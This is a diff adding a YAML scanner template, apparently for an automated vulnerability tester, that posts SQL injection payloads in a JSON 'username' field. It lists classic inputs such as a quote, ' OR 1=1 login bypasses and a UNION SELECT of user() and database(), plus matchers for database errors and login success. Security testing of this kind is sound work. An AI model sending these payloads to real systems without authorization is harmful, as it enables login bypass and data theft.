@@ -1,0 +1,58 @@
+id: generic-sqli-post-json
+info:
+  name: SQL Injection (POST/JSON)
+  severity: critical
+  description: Generic SQL injection testing for POST/JSON bodies
+  tags:
+    - sqli
+    - injection
+    - json
+    - generic
+
+generic:
+  endpoint: "{{sqli_post}}"
+
+  method: POST
+
+  content_type: "application/json"
+
+  # Body template - {{payload}} will be replaced with each payload
+  body_template: '{"{{parameter}}": "{{payload}}"}'
+
+  parameter: "username"
+
+  payloads:
+    - name: "single_quote"
+      value: "'"
+
+    - name: "or_bypass"
+      value: "' OR '1'='1"
+
+    - name: "login_bypass"
+      value: "' OR 1=1-- -"
+
+    - name: "union_select"
+      value: "' UNION SELECT NULL,user(),database()-- -"
+
+    - name: "comment_bypass"
+      value: "admin'--"
+
+    - name: "boolean_or"
+      value: "' OR '1'='1'--"
+
+  matchers:
+    - type: word
+      words:
+        - "You have an error in your SQL syntax"
+        - "mysql_fetch"
+        - "Warning: mysql"
+        - "ORA-01756"
+        - "Syntax error"
+        - "invalid query"
+        - "authentication"
+        - "token"
+        - "welcome"
+      condition: or
+
+    - type: status
+      values: [200, 201]
